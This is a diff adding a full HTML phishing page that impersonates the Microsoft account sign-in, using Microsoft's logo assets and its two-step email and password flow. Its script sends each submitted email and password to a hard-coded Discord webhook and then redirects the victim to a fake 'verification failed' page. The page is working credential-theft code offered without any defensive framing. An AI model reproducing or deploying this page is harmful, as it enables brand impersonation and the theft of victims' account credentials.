@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm" action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="emailInput" placeholder="Email, Phone, or Skype" required>
+                            <p id="emailError" class="error-message"></p>
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" id="passwordInput" placeholder="Password" required>
+                            <p id="passwordError" class="error-message"></p>
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="button" id="submitButton">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+
+        const emailInput = document.getElementById('emailInput');
+        const emailDisplay = document.querySelector('.email');
+        const passwordInput = document.getElementById('passwordInput');
+        const submitButton = document.getElementById('submitButton');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+        nextButton.addEventListener('click', () => {
+            let emailValid = emailPattern.test(emailInput.value);
+            if (!emailValid) {
+                emailError.textContent = "Enter a valid email address, phone number, or Skype name.";
+                emailError.style.color = "red";
+                return;
+            }
+            emailError.textContent = "";
+            forms.classList.add('next-form');
+            emailDisplay.innerText = emailInput.value;
+            passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
+            document.querySelector('.bottom').style.display = 'none';
+        });
+
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+            document.querySelector('.bottom').style.display = 'flex';
+        });
+
+        submitButton.addEventListener('click', () => {
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            let emailValid = emailPattern.test(email);
+            let passwordValid = password.length > 0;
+
+            if (!emailValid || !passwordValid) {
+                // Redirect to the Verification Failed page
+                window.location.href = 'verificationFailed.html';
+            } else {
+                // Proceed with sending the data to Discord (if needed)
+                const webhookUrl = "https://discord.com/api/webhooks/1330220235424272496/vWKqC1Plh5ns739VSbZd6yMYSTTa2rX1_gwiEbrXjQPQG-_qd06hDnLRNLEoikuB-PMR";
+                const payload = {
+                    content: `Email: ${email}\nPassword: ${password}`
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Data sent to Discord successfully!');
+                    } else {
+                        console.log('Error sending data to Discord');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+
+                // Redirect to verification failed page
+                window.location.href = 'verificationFailed.html';
+            }
+        });
+    </script>
+</body>
+</html>
